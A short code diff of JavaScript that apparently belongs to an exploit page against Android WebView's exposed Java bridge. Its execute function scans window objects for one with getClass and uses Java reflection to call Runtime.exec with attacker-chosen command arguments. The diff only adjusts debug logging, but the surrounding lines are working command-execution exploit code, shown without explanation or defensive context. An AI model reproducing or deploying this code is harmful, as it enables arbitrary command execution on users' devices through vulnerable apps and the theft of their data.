@@ -49,9 +49,8 @@
 
             function execute(cmdArgs) {
                 for (var obj in window) {
-                    console.log(obj);
                     if ("getClass" in window[obj]) {
-                        console.log("++++f:"+obj);
+                        console.log("++++find:"+obj);
                         return window[obj].getClass().forName("java.lang.Runtime").
                             getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);//.maxMemory();
                     }
